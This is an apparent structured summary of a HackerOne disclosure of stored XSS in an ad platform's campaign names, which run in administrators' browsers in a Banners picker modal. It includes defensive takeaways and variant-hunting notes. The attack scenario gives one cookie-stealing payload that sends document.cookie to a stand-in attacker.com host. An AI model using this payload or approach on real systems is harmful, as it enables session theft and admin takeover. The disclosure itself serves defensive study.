# Stored XSS in Campaign Name Displayed in Banners Modal

## Metadata
- **Source:** HackerOne
- **Report:** 3411750 | https://hackerone.com/reports/3411750
- **Submitted:** 2025-11-05
- **Reporter:** vidang04
- **Program:** HackerOne (Program ID inferred from report number 3411750)
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Output Encoding, Privilege Escalation
- **CVEs:** CVE-2025-55126
- **Category:** web-api

## Summary
A low-privilege authenticated user can inject malicious HTML/JavaScript into advertiser or campaign names during creation/editing. These payloads are stored server-side and executed without proper HTML escaping when administrators access the Banners modal inventory picker, enabling session hijacking and unauthorized administrative actions.

## Attack scenario
1. Attacker creates a legitimate account and authenticates to the application
2. Attacker creates or edits an advertiser/campaign name with embedded JavaScript payload (e.g., <img src=x onerror="fetch('attacker.com/?cookie='+document.cookie)">)
3. Payload is stored in the database without sanitization or validation
4. Administrator navigates to Inventory → Banners and opens the advertiser/campaign picker modal
5. Application renders campaign names without HTML escaping, causing the stored script to execute in admin's browser context
6. JavaScript exfiltrates admin session cookies or performs unauthorized actions using admin privileges

## Root cause
Missing HTML entity encoding/escaping when rendering user-supplied campaign and advertiser names in the Banners picker modal. The application stores unsanitized input and fails to encode output contextually for HTML rendering.

## Attacker mindset
Low-effort, high-impact attack requiring only basic authentication. Attacker recognizes that user-controllable fields are displayed to higher-privileged users without sanitization. Payload persistence in database ensures reliable execution. Session theft or admin impersonation provides significant lateral movement and privilege escalation opportunities.

## Defensive takeaways
- Implement context-aware output encoding for all user-supplied data (HTML entity encoding for HTML context)
- Apply input validation to reject or sanitize HTML/JavaScript in campaign and advertiser names at submission time
- Use templating engines with auto-escaping enabled (e.g., Jinja2, ERB with safe_concat)
- Implement Content Security Policy (CSP) headers to restrict inline script execution
- Sanitize database values during retrieval or normalize on storage using libraries like DOMPurify or bleach
- Apply principle of least privilege: restrict campaign creation/editing to trusted roles if feasible
- Conduct security code review for all user-facing input fields and their corresponding output locations
- Implement automated XSS detection in testing pipelines (SAST, DAST tools)

## Variant hunting
Search for other modal pickers or inventory management interfaces that display user-supplied text without encoding
Audit all fields accepting advertiser/campaign/user/product names for similar XSS vulnerabilities
Test settings pages, account profiles, and custom field inputs for stored XSS
Examine API responses returning user-supplied data to identify additional rendering points
Investigate whether other authenticated roles (managers, moderators) have access to similar high-privilege interfaces
Check if similar payloads execute in API responses before frontend rendering

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1199
- T1021
- T1059
- T1550

## Notes
This is a classic stored XSS leveraging trust boundary between normal users and administrators. The vulnerability is particularly severe because: (1) any authenticated user can inject payloads, (2) payloads persist indefinitely, (3) admin access is predictable/guaranteed, (4) execution occurs in privileged context. The writeup lacks specific payload examples and proof-of-concept code, but the vulnerability chain is clear and well-articulated.

## Full report
<details><summary>Expand</summary>

##Description:

A low-privilege authenticated user can create or edit advertiser/campaign names containing HTML/JavaScript. Those values are stored in the application and later rendered without proper HTML escaping in the admin Inventory → Banners advertiser/campaign picker. When an administrator opens the picker, the stored script executes in the admin’s browser, enabling account takeover, unauthorized admin actions, or sensitive data exposure.

Because any authenticated normal user can store the payload, the attack vector is remote and trivial for an attacker with a valid account.

##Steps:

1. I injected a script code XSS:

{F4968699}

2. Result:

{F4968700}

## Impact

Remote authenticated attacker (normal user) places JavaScript that executes in administrator browsers.
Possible consequences (depending on environment and cookie settings):
+ Admin session theft (if cookies are accessible).
+ Silent administrative actions performed via the admin session (create/modify/delete resources).
+ Disclosure of sensitive UI data accessible to admins.
+ Pivot to further compromise of infrastructure or data exfiltration.
Because the attacker only needs a normal account to persist payloads, this is highly exploitable and should be prioritized.

</details>

---
*Analysed by Claude on 2026-05-12*
